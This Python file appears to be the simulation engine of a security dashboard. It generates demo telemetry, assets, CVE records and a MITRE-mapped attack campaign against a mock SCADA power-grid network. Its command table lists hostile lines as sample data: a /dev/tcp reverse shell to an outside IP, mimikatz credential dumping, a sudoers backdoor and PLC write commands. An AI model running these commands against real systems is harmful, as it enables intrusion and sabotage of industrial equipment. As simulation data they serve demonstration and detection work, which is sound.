"""
SentinelGrid AI — Simulation Engine

Generates realistic critical infrastructure telemetry for demonstration.
Simulates multi-stage attack campaigns mapped to MITRE ATT&CK.
Provides seed data for assets, vulnerabilities, and incidents.
"""
import logging
import random
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Any
import json

logger = logging.getLogger(__name__)

# ========================
# ASSET TEMPLATES
# ========================

SEED_ASSETS = [
    {"name": "Internet Gateway", "asset_type": "router", "ip_address": "203.0.113.1", "network_segment": "internet", "criticality": "critical", "os_type": "Cisco IOS 15.2", "position_x": 400, "position_y": 50, "services_running": ["routing", "nat", "vpn"], "open_ports": [443, 500, 4500]},
    {"name": "Perimeter Firewall", "asset_type": "firewall", "ip_address": "10.0.0.1", "network_segment": "dmz", "criticality": "critical", "os_type": "Palo Alto PAN-OS 11", "position_x": 400, "position_y": 150, "services_running": ["firewall", "ips", "vpn"], "open_ports": [443, 22]},
    {"name": "Web Application Server", "asset_type": "web_server", "ip_address": "10.0.1.10", "network_segment": "dmz", "criticality": "high", "os_type": "Ubuntu 22.04 LTS", "position_x": 250, "position_y": 280, "services_running": ["nginx", "nodejs", "pm2"], "open_ports": [80, 443, 8080]},
    {"name": "API Gateway", "asset_type": "app_server", "ip_address": "10.0.1.11", "network_segment": "dmz", "criticality": "high", "os_type": "Ubuntu 22.04 LTS", "position_x": 550, "position_y": 280, "services_running": ["kong", "redis"], "open_ports": [8000, 8443]},
    {"name": "Corporate Database", "asset_type": "database", "ip_address": "10.0.2.20", "network_segment": "internal", "criticality": "critical", "os_type": "PostgreSQL 15 on RHEL 9", "position_x": 200, "position_y": 420, "services_running": ["postgresql", "pgbouncer"], "open_ports": [5432]},
    {"name": "Active Directory DC", "asset_type": "app_server", "ip_address": "10.0.2.5", "network_segment": "internal", "criticality": "critical", "os_type": "Windows Server 2022", "position_x": 400, "position_y": 420, "services_running": ["ldap", "kerberos", "dns", "gpo"], "open_ports": [389, 636, 88, 53]},
    {"name": "Email Server", "asset_type": "mail_server", "ip_address": "10.0.2.30", "network_segment": "internal", "criticality": "high", "os_type": "Exchange Server 2019", "position_x": 600, "position_y": 420, "services_running": ["smtp", "imap", "owa"], "open_ports": [25, 143, 443]},
    {"name": "Engineering Workstation", "asset_type": "endpoint", "ip_address": "10.0.3.50", "network_segment": "internal", "criticality": "high", "os_type": "Windows 11 Pro", "position_x": 150, "position_y": 550, "services_running": ["rdp", "scada_client"], "open_ports": [3389]},
    {"name": "SOC Analyst Workstation", "asset_type": "endpoint", "ip_address": "10.0.3.51", "network_segment": "management", "criticality": "medium", "os_type": "Windows 11 Pro", "position_x": 350, "position_y": 550, "services_running": ["rdp", "siem_agent"], "open_ports": [3389]},
    {"name": "SCADA HMI Server", "asset_type": "scada_hmi", "ip_address": "10.0.10.100", "network_segment": "scada", "criticality": "critical", "os_type": "Windows Server 2019 (Isolated)", "position_x": 550, "position_y": 550, "services_running": ["scada_hmi", "modbus_gateway", "opc_ua"], "open_ports": [502, 4840]},
    {"name": "PLC Controller #1", "asset_type": "plc", "ip_address": "10.0.10.201", "network_segment": "scada", "criticality": "critical", "os_type": "Siemens S7-1500 FW v2.9", "position_x": 450, "position_y": 680, "services_running": ["modbus_slave", "s7comm"], "open_ports": [502, 102]},
    {"name": "PLC Controller #2", "asset_type": "plc", "ip_address": "10.0.10.202", "network_segment": "scada", "criticality": "critical", "os_type": "Allen-Bradley ControlLogix", "position_x": 650, "position_y": 680, "services_running": ["enip", "cip"], "open_ports": [44818]},
    {"name": "Historian Database", "asset_type": "database", "ip_address": "10.0.10.50", "network_segment": "scada", "criticality": "high", "os_type": "OSIsoft PI Server", "position_x": 300, "position_y": 680, "services_running": ["pi_server", "pi_archive"], "open_ports": [5450, 5457]},
    {"name": "Backup Server", "asset_type": "app_server", "ip_address": "10.0.4.10", "network_segment": "management", "criticality": "high", "os_type": "Ubuntu 22.04 LTS", "position_x": 750, "position_y": 420, "services_running": ["veeam_agent", "nfs"], "open_ports": [2049, 9392]},
]

# Network topology edges
TOPOLOGY_EDGES = [
    {"source": "Internet Gateway", "target": "Perimeter Firewall", "edge_type": "network", "label": "WAN"},
    {"source": "Perimeter Firewall", "target": "Web Application Server", "edge_type": "network", "label": "DMZ"},
    {"source": "Perimeter Firewall", "target": "API Gateway", "edge_type": "network", "label": "DMZ"},
    {"source": "Perimeter Firewall", "target": "Active Directory DC", "edge_type": "network", "label": "Internal"},
    {"source": "Web Application Server", "target": "Corporate Database", "edge_type": "data_flow", "label": "SQL"},
    {"source": "API Gateway", "target": "Corporate Database", "edge_type": "data_flow", "label": "API"},
    {"source": "Active Directory DC", "target": "Email Server", "edge_type": "auth", "label": "LDAP"},
    {"source": "Active Directory DC", "target": "Engineering Workstation", "edge_type": "auth", "label": "GPO"},
    {"source": "Active Directory DC", "target": "SOC Analyst Workstation", "edge_type": "auth", "label": "GPO"},
    {"source": "Engineering Workstation", "target": "SCADA HMI Server", "edge_type": "network", "label": "SCADA"},
    {"source": "SCADA HMI Server", "target": "PLC Controller #1", "edge_type": "scada", "label": "Modbus"},
    {"source": "SCADA HMI Server", "target": "PLC Controller #2", "edge_type": "scada", "label": "EtherNet/IP"},
    {"source": "SCADA HMI Server", "target": "Historian Database", "edge_type": "data_flow", "label": "OPC-UA"},
    {"source": "Corporate Database", "target": "Backup Server", "edge_type": "backup", "label": "Backup"},
]

# ========================
# SEED VULNERABILITIES
# ========================

SEED_VULNERABILITIES = [
    {"cve_id": "CVE-2024-3400", "title": "Palo Alto PAN-OS Command Injection", "cvss_score": 10.0, "severity": "CRITICAL", "exploit_available": True, "exploit_maturity": "weaponized", "affected_asset": "Perimeter Firewall", "business_impact": "critical", "affected_component": "PAN-OS GlobalProtect"},
    {"cve_id": "CVE-2024-21762", "title": "FortiOS SSL VPN Out-of-Bounds Write", "cvss_score": 9.8, "severity": "CRITICAL", "exploit_available": True, "exploit_maturity": "functional", "affected_asset": "Perimeter Firewall", "business_impact": "critical", "affected_component": "FortiOS 7.4.x"},
    {"cve_id": "CVE-2023-44228", "title": "Apache Log4j2 Remote Code Execution", "cvss_score": 10.0, "severity": "CRITICAL", "exploit_available": True, "exploit_maturity": "weaponized", "affected_asset": "Web Application Server", "business_impact": "critical", "affected_component": "Log4j 2.17.0"},
    {"cve_id": "CVE-2024-0012", "title": "PAN-OS Authentication Bypass", "cvss_score": 9.1, "severity": "CRITICAL", "exploit_available": True, "exploit_maturity": "functional", "affected_asset": "Perimeter Firewall", "business_impact": "critical", "affected_component": "PAN-OS Management Interface"},
    {"cve_id": "CVE-2023-36884", "title": "MS Office HTML RCE (Storm-0978)", "cvss_score": 8.8, "severity": "HIGH", "exploit_available": True, "exploit_maturity": "weaponized", "affected_asset": "Engineering Workstation", "business_impact": "high", "affected_component": "Microsoft Office 2019"},
    {"cve_id": "CVE-2023-23397", "title": "MS Outlook Privilege Escalation", "cvss_score": 9.8, "severity": "CRITICAL", "exploit_available": True, "exploit_maturity": "weaponized", "affected_asset": "Email Server", "business_impact": "high", "affected_component": "Microsoft Outlook"},
    {"cve_id": "CVE-2024-29988", "title": "Windows SmartScreen Bypass", "cvss_score": 8.8, "severity": "HIGH", "exploit_available": True, "exploit_maturity": "proof_of_concept", "affected_asset": "SOC Analyst Workstation", "business_impact": "medium", "affected_component": "Windows SmartScreen"},
    {"cve_id": "CVE-2023-46747", "title": "F5 BIG-IP Unauthenticated RCE", "cvss_score": 9.8, "severity": "CRITICAL", "exploit_available": True, "exploit_maturity": "functional", "affected_asset": "API Gateway", "business_impact": "high", "affected_component": "F5 BIG-IP 17.1.x"},
    {"cve_id": "CVE-2022-2274", "title": "Siemens SIMATIC S7-1500 Memory Protection Bypass", "cvss_score": 9.8, "severity": "CRITICAL", "exploit_available": False, "exploit_maturity": "proof_of_concept", "affected_asset": "PLC Controller #1", "business_impact": "critical", "affected_component": "Siemens S7-1500 FW < v2.9.4"},
    {"cve_id": "CVE-2023-3595", "title": "Rockwell ControlLogix RCE", "cvss_score": 9.8, "severity": "CRITICAL", "exploit_available": False, "exploit_maturity": "proof_of_concept", "affected_asset": "PLC Controller #2", "business_impact": "critical", "affected_component": "Allen-Bradley ControlLogix FW < v33"},
    {"cve_id": "CVE-2024-23222", "title": "PostgreSQL Privilege Escalation", "cvss_score": 7.8, "severity": "HIGH", "exploit_available": False, "exploit_maturity": "unproven", "affected_asset": "Corporate Database", "business_impact": "high", "affected_component": "PostgreSQL 15.x"},
    {"cve_id": "CVE-2023-20198", "title": "Cisco IOS XE Web UI Privilege Escalation", "cvss_score": 10.0, "severity": "CRITICAL", "exploit_available": True, "exploit_maturity": "weaponized", "affected_asset": "Internet Gateway", "business_impact": "critical", "affected_component": "Cisco IOS XE 16.x"},
]


# ========================
# ATTACK CAMPAIGN TEMPLATES
# ========================

ATTACK_CAMPAIGNS = [
    {
        "name": "Operation ShadowGrid",
        "description": "APT campaign targeting power grid SCADA systems",
        "stages": [
            {"tactic": "Initial Access", "technique": "T1190", "action": "exploit_webshell", "target_asset": "Web Application Server", "severity": "HIGH", "protocol": "HTTP"},
            {"tactic": "Execution", "technique": "T1059.004", "action": "reverse_shell", "target_asset": "Web Application Server", "severity": "CRITICAL", "protocol": "TCP"},
            {"tactic": "Discovery", "technique": "T1082", "action": "system_enumeration", "target_asset": "Web Application Server", "severity": "MEDIUM", "protocol": "TCP"},
            {"tactic": "Credential Access", "technique": "T1003", "action": "credential_dump", "target_asset": "Active Directory DC", "severity": "CRITICAL", "protocol": "TCP"},
            {"tactic": "Lateral Movement", "technique": "T1021.001", "action": "rdp_lateral", "target_asset": "Engineering Workstation", "severity": "HIGH", "protocol": "TCP"},
            {"tactic": "Lateral Movement", "technique": "T1021", "action": "ssh_to_scada", "target_asset": "SCADA HMI Server", "severity": "CRITICAL", "protocol": "SSH"},
            {"tactic": "Collection", "technique": "T1005", "action": "data_collection", "target_asset": "Historian Database", "severity": "HIGH", "protocol": "TCP"},
            {"tactic": "Impact", "technique": "T0855", "action": "modbus_write_coil", "target_asset": "PLC Controller #1", "severity": "CRITICAL", "protocol": "MODBUS"},
        ]
    },
]

# Individual event templates for random generation
EVENT_TEMPLATES = [
    # Auth events
    {"event_type": "auth_event", "action": "failed_login", "severity": "MEDIUM", "protocol": "SSH", "user_templates": ["admin", "root", "operator", "test"]},
    {"event_type": "auth_event", "action": "successful_login", "severity": "INFO", "protocol": "SSH", "user_templates": ["soc_analyst", "engineer"]},
    {"event_type": "auth_event", "action": "failed_login", "severity": "HIGH", "protocol": "HTTP", "user_templates": ["admin", "administrator"]},
    {"event_type": "auth_event", "action": "password_change", "severity": "MEDIUM", "protocol": "LDAP", "user_templates": ["admin"]},
    # Network events
    {"event_type": "network_flow", "action": "connection", "severity": "INFO", "protocol": "TCP", "user_templates": []},
    {"event_type": "network_flow", "action": "port_scan", "severity": "HIGH", "protocol": "TCP", "user_templates": []},
    {"event_type": "network_flow", "action": "dns_query", "severity": "INFO", "protocol": "UDP", "user_templates": []},
    # System events
    {"event_type": "system_log", "action": "process_start", "severity": "INFO", "protocol": "LOCAL", "user_templates": ["system"]},
    {"event_type": "system_log", "action": "config_change", "severity": "HIGH", "protocol": "LOCAL", "user_templates": ["admin"]},
    {"event_type": "system_log", "action": "sudo_su", "severity": "HIGH", "protocol": "LOCAL", "user_templates": ["operator"]},
    # SCADA events
    {"event_type": "scada_reading", "action": "modbus_read", "severity": "INFO", "protocol": "MODBUS", "user_templates": []},
    {"event_type": "scada_reading", "action": "modbus_write", "severity": "CRITICAL", "protocol": "MODBUS", "user_templates": []},
    {"event_type": "scada_reading", "action": "dnp3_operate", "severity": "HIGH", "protocol": "DNP3", "user_templates": []},
    # File events
    {"event_type": "file_access", "action": "file_read", "severity": "INFO", "protocol": "SMB", "user_templates": ["analyst", "engineer"]},
    {"event_type": "file_access", "action": "file_write", "severity": "MEDIUM", "protocol": "SMB", "user_templates": ["admin"]},
]

GLOBAL_ORIGINS = [
    {"ip_prefix": "198.51.100", "country": "United States", "country_code": "US", "city": "Ashburn", "lat": 39.04, "lng": -77.49, "isp": "AWS"},
    {"ip_prefix": "95.163.220", "country": "Russia", "country_code": "RU", "city": "Moscow", "lat": 55.76, "lng": 37.62, "isp": "Digital Ocean"},
    {"ip_prefix": "220.181.38", "country": "China", "country_code": "CN", "city": "Beijing", "lat": 39.90, "lng": 116.41, "isp": "CHINANET"},
    {"ip_prefix": "46.165.2", "country": "Germany", "country_code": "DE", "city": "Frankfurt", "lat": 50.11, "lng": 8.68, "isp": "Hetzner"},
    {"ip_prefix": "103.241.136", "country": "India", "country_code": "IN", "city": "Mumbai", "lat": 19.08, "lng": 72.88, "isp": "Tata Communications"},
    {"ip_prefix": "185.220.101", "country": "Netherlands", "country_code": "NL", "city": "Amsterdam", "lat": 52.37, "lng": 4.90, "isp": "Tor Exit Node"},
    {"ip_prefix": "45.155.205", "country": "Iran", "country_code": "IR", "city": "Tehran", "lat": 35.69, "lng": 51.39, "isp": "Unknown"},
    {"ip_prefix": "175.45.176", "country": "North Korea", "country_code": "KP", "city": "Pyongyang", "lat": 39.02, "lng": 125.75, "isp": "Star JV"},
]


class SimulationEngine:
    """Generates realistic security telemetry for demo purposes"""

    def __init__(self):
        self.assets = SEED_ASSETS
        self.vulnerabilities = SEED_VULNERABILITIES
        self.campaigns = ATTACK_CAMPAIGNS
        self.event_templates = EVENT_TEMPLATES

    def generate_telemetry_batch(self, count: int = 50, include_attack: bool = True) -> List[Dict]:
        """Generate a batch of mixed telemetry events"""
        events = []

        # Generate normal background events (70%)
        normal_count = int(count * 0.7)
        for _ in range(normal_count):
            events.append(self._generate_normal_event())

        # Generate suspicious/attack events (30%)
        attack_count = count - normal_count
        if include_attack:
            for _ in range(attack_count):
                events.append(self._generate_security_event())

        # Sort by timestamp
        events.sort(key=lambda e: e.get('timestamp', ''))
        return events

    def generate_attack_campaign(self) -> List[Dict]:
        """Generate a complete multi-stage attack campaign"""
        campaign = random.choice(self.campaigns)
        events = []
        origin = random.choice(GLOBAL_ORIGINS)
        base_time = datetime.now(timezone.utc) - timedelta(hours=random.randint(1, 6))

        for i, stage in enumerate(campaign['stages']):
            target_asset = next((a for a in self.assets if a['name'] == stage['target_asset']), self.assets[0])
            event_time = base_time + timedelta(minutes=i * random.randint(5, 30))

            event = {
                "timestamp": event_time.isoformat(),
                "event_type": "network_flow" if stage['protocol'] != 'LOCAL' else "system_log",
                "source": f"sensor_{target_asset['network_segment']}",
                "source_ip": f"{origin['ip_prefix']}.{random.randint(2, 254)}",
                "dest_ip": target_asset['ip_address'],
                "source_port": random.randint(1024, 65535),
                "dest_port": target_asset.get('open_ports', [80])[0] if target_asset.get('open_ports') else 80,
                "protocol": stage['protocol'],
                "action": stage['action'],
                "user_identity": random.choice(["admin", "operator", "root", ""]),
                "severity": stage['severity'],
                "resource": target_asset['name'],
                "command": self._generate_command(stage['action']),
                "mitre_technique_id": stage['technique'],
                "mitre_tactic": stage['tactic'],
                "location": {
                    "city": origin['city'],
                    "country": origin['country'],
                    "country_code": origin['country_code'],
                    "lat": origin['lat'] + random.uniform(-0.5, 0.5),
                    "lng": origin['lng'] + random.uniform(-0.5, 0.5),
                    "isp": origin['isp'],
                },
                "metadata": {
                    "campaign": campaign['name'],
                    "stage_index": i,
                    "total_stages": len(campaign['stages']),
                }
            }
            events.append(event)

        return events

    def get_seed_assets(self) -> List[Dict]:
        """Return seed asset data"""
        return self.assets

    def get_topology_edges(self) -> List[Dict]:
        """Return network topology edge data"""
        return TOPOLOGY_EDGES

    def get_seed_vulnerabilities(self) -> List[Dict]:
        """Return seed vulnerability data"""
        return self.vulnerabilities

    def _generate_normal_event(self) -> Dict:
        """Generate a normal (benign) telemetry event"""
        template = random.choice([t for t in self.event_templates if t['severity'] in ('INFO', 'MEDIUM')])
        asset = random.choice(self.assets)
        time_offset = timedelta(seconds=random.randint(0, 3600))

        return {
            "timestamp": (datetime.now(timezone.utc) - time_offset).isoformat(),
            "event_type": template['event_type'],
            "source": f"sensor_{asset['network_segment']}",
            "source_ip": asset['ip_address'],
            "dest_ip": random.choice(self.assets)['ip_address'],
            "source_port": random.randint(1024, 65535),
            "dest_port": random.choice(asset.get('open_ports', [80])),
            "protocol": template['protocol'],
            "action": template['action'],
            "user_identity": random.choice(template.get('user_templates', [''])) if template.get('user_templates') else '',
            "severity": template['severity'],
            "resource": asset['name'],
        }

    def _generate_security_event(self) -> Dict:
        """Generate a suspicious/attack telemetry event"""
        template = random.choice([t for t in self.event_templates if t['severity'] in ('HIGH', 'CRITICAL')])
        target_asset = random.choice(self.assets)
        origin = random.choice(GLOBAL_ORIGINS)
        time_offset = timedelta(seconds=random.randint(0, 1800))

        return {
            "timestamp": (datetime.now(timezone.utc) - time_offset).isoformat(),
            "event_type": template['event_type'],
            "source": f"sensor_{target_asset['network_segment']}",
            "source_ip": f"{origin['ip_prefix']}.{random.randint(2, 254)}",
            "dest_ip": target_asset['ip_address'],
            "source_port": random.randint(1024, 65535),
            "dest_port": random.choice(target_asset.get('open_ports', [80])),
            "protocol": template['protocol'],
            "action": template['action'],
            "user_identity": random.choice(template.get('user_templates') or ['attacker']),
            "severity": template['severity'],
            "resource": target_asset['name'],
            "command": self._generate_command(template['action']),
            "location": {
                "city": origin['city'], "country": origin['country'],
                "country_code": origin['country_code'],
                "lat": origin['lat'] + random.uniform(-1, 1),
                "lng": origin['lng'] + random.uniform(-1, 1),
                "isp": origin['isp'],
            },
        }

    def _generate_command(self, action: str) -> str:
        """Generate a realistic command for the given action"""
        commands = {
            "exploit_webshell": "POST /upload.php HTTP/1.1\nContent-Type: multipart/form-data; boundary=---\n---\nContent-Disposition: form-data; name=\"file\"; filename=\"cmd.php\"",
            "reverse_shell": "bash -i >& /dev/tcp/95.163.220.14/4444 0>&1",
            "system_enumeration": "uname -a && cat /etc/passwd && netstat -tulpn && df -h",
            "credential_dump": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
            "rdp_lateral": "mstsc.exe /v:10.0.3.50 /admin",
            "ssh_to_scada": "ssh -i stolen_key operator@10.0.10.100",
            "data_collection": "tar czf /tmp/data.tar.gz /var/lib/pi/archive/",
            "modbus_write_coil": "modbus-cli write 10.0.10.201 --coil 0x0001 0xFF00",
            "port_scan": "nmap -sS -T4 10.0.0.0/8",
            "failed_login": f"SSH login attempt: user=admin password=admin123",
            "sudo_su": "sudo su - root",
            "config_change": "echo 'attacker ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
            "modbus_write": "Write Multiple Registers: addr=0x0064 count=4 values=[0x0000, 0xFFFF, 0x0000, 0xFFFF]",
            "dnp3_operate": "DNP3 Direct Operate: Object=12 Variation=1 Index=0 Code=LATCH_ON",
        }
        return commands.get(action, f"command: {action}")


# Global instance
simulation_engine = SimulationEngine()
